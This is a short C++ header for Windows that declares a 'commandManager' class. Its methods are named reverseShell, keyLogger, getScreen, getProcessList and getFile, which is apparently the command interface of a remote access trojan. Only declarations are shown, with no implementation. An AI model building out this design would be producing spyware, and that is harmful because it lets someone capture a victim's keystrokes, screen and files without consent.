#pragma once
#include <string>
#include <Windows.h>
#include <map>


class commandManager
{
//private:

public:
	ULONG64 screen_len = 0;
	FILE* fp = NULL;
	commandManager();
	std::string reverseShell(std::string cmd);
	std::map<DWORD, std::wstring> getProcessList();
	LPVOID getScreen();
	void getFile(std::string& path, LPCWSTR server);
	void saveFIle(std::string& path, std::string& data, DWORD seq);
	void keyLogger();
	std::wstring pidToName(DWORD procID);
};

